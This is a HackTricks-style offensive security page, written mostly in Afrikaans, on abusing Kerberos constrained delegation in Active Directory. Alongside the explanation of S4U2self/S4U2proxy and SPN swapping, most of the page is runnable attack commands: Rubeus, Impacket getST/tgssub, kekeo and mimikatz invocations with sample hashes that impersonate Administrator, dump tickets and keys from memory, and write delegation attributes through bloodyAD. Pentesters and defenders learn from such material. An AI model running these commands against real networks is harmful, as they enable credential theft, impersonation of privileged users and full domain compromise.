# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Deur dit te gebruik, kan 'n Domain admin 'n rekenaar **toelaat** om 'n **gebruiker of rekenaar na te boots** teen enige **diens** van 'n masjien.

- **Service for User to self (_S4U2self_):** Enige **diensrekening wat 'n SPN besit**, kan gewoonlik namens 'n arbitrêre gebruiker 'n TGS na homself verkry. As die rekening ook [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_ het, is daardie TGS **forwardable**, wat protocol transition direk nuttig maak vir **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** 'n **Diensrekening** kan namens 'n gebruiker 'n TGS verkry vir die SPNs wat in **msDS-AllowedToDelegateTo** gelys is. Die bewyskaartjie wat in S4U2Proxy gebruik word, moet 'n **forwardable** kaartjie na die delegerende diens wees: óf 'n werklike kliënt-na-diens-kaartjie wat van die slagoffer vasgelê is, óf een wat met **S4U2Self + T2A4D** gegenereer is.

**Nota**: As 'n gebruiker in AD gemerk is as ‘_Account is sensitive and cannot be delegated_’, of 'n lid van **Protected Users** is, sal jy gewoonlik **nie in staat wees om** hulle deur constrained delegation **na te boots nie**. In moderne domeine moet jy **AES**-materiaal bo aannames wat slegs op RC4 staatmaak, verkies wanneer jy delegation-enabled accounts teiken.

Dit beteken dat as jy die **hash van die diens kompromitteer**, jy **gebruikers kan naboots** en namens hulle **toegang** tot enige **diens** op die aangeduide masjiene kan verkry (moontlike **privesc**).

Verder sal jy **nie slegs toegang hê tot die diens wat die gebruiker kan naboots nie, maar ook tot enige diens**, omdat die SPN (die diensnaam wat aangevra word) nie nagegaan word nie (in die kaartjie word hierdie deel nie geënkripteer of onderteken nie). As jy dus toegang tot die **CIFS-diens** het, kan jy ook toegang tot die **HOST-diens** verkry deur byvoorbeeld die `/altservice`-vlag in Rubeus te gebruik. Dieselfde SPN-swappingswakheid word deur **Impacket getST -altservice** en ander tooling uitgebuit.

Ook is **LDAP-dienstoegang op 'n DC** nodig om 'n **DCSync** uit te buit.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Nota vir operateur:** moenie slegs op **ADUC**- of BloodHound-skermkiekies staatmaak vir **gMSA/sMSA**-hersiening nie. Daardie rekeninge verberg dikwels die gewone Delegation-oortjie, dus lys die rou **`userAccountControl`**- en **`msDS-AllowedToDelegateTo`**-attribute direk op.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition teenoor Kerberos-only constrained delegation

As die gekompromitteerde account **T2A4D** het, kan jy gewoonlik die volledige **`S4U2Self -> S4U2Proxy`**-ketting slegs vanaf die service key/TGT voltooi.<sup>[[2]](#references)</sup>

As dit slegs **`msDS-AllowedToDelegateTo`** het (die klassieke **"Use Kerberos only"**-modus), kan die delegation steeds misbruik word, maar die evidence ticket vir S4U2Proxy moet 'n **regte forwardable user-to-service ticket** vir die delegerende diens wees. In praktyk beteken dit dat jy 'n slagoffer-TGS uit **LSASS/ccache** moet steel of capture en dit in die tweede fase moet invoer (`/tgs:` in Rubeus). 'n **Non-forwardable** S4U2Self-ticket is **nie** genoeg vir classic constrained delegation nie; as dit jou enigste evidence ticket is, kyk eerder na [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation-notas (2025+)

Sedert **Windows Server 2012/2012 R2** ondersteun die KDC **constrained delegation across domains/forests** via S4U2Proxy-uitbreidings. Moderne builds (Windows Server 2016–2025) behou hierdie gedrag en voeg twee PAC SIDs by om protocol transition aan te dui:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wanneer die gebruiker normaalweg geauthenticeer is.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wanneer 'n diens die identiteit deur protocol transition asserted het.

Verwag `SERVICE_ASSERTED_IDENTITY` binne die PAC wanneer protocol transition oor domains gebruik word; dit bevestig dat die S4U2Proxy-stap suksesvol was.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Onlangse Impacket (0.11.x+) stel dieselfde S4U-ketting en SPN-swapping as Rubeus beskikbaar:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
As jy verkies om eers die gebruiker se ST te forge (bv. slegs met ’n offline hash), kombineer **ticketer.py** met **getST.py** vir S4U2Proxy. **tgssub.py** is ook nuttig wanneer jy reeds ’n werkende ccache het en net die service class vir dieselfde host moet omruil. Sien die oop Impacket issue #1713 vir huidige eienaardighede (KRB_AP_ERR_MODIFIED wanneer die geforge ST nie met die SPN key ooreenstem nie).<sup>[[2]](#references)</sup>

### Outomatisering van delegation-opstelling vanaf low-priv creds

As jy reeds **GenericAll/WriteDACL** oor ’n computer- of service account het, kan jy die vereiste attributes op afstand stuur sonder RSAT deur **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Dit laat jou toe om ’n constrained delegation-pad vir privesc te bou sonder DA-voorregte sodra jy daardie attribute kan skryf.

- Stap 1: **Kry TGT van die toegelate diens**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Daar is **ander maniere om 'n TGT-ticket te bekom** of die **RC4** of **AES256** te bekom sonder om SYSTEM op die rekenaar te wees, soos die Printer Bug en unconstrained delegation, NTLM relaying en Active Directory Certificate Service abuse
>
> **Deur slegs daardie TGT-ticket (of hash) te hê, kan jy hierdie aanval uitvoer sonder om die hele rekenaar te kompromitteer.**

- Step2: **Kry TGS vir die diens deur die gebruiker na te boots**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Meer inligting in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) en [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Oorsig van Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Misbruik van Delegation met Impacket (Deel 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: An Offensive Kerberos Overview (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
